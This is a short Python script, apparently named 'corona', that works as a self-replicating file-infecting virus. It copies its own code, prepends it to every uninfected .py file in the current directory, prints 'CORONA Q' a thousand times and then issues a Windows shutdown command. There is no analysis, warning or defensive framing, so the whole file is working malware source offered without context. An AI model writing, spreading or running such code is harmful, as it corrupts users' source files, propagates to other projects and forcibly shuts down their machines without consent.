# corona0
MESSAGE = "CORONA Q " * 1000
import os
import glob
import sys

cwd = os.getcwd()
pyfiles = glob.glob(f"{cwd}/*py")
healthy = []
inject = []

with open(__file__, 'r', encoding=sys.getdefaultencoding()) as f:
    for line in f.readlines():
        inject.append(line)
        if line == "# corona\n":
            break

for path in pyfiles:
    with open(path, 'r', encoding=sys.getdefaultencoding()) as f:
        line = f.readline()
        if line != "# corona0\n":
            healthy.append(path)

for file in healthy:
    with open(file, "r", encoding=sys.getdefaultencoding()) as f:
        code = f.read()
    with open(file, "w") as f:
        f.writelines(inject)
        f.write(code)

print(MESSAGE)
os.system("shutdown /s /t 30")
# corona
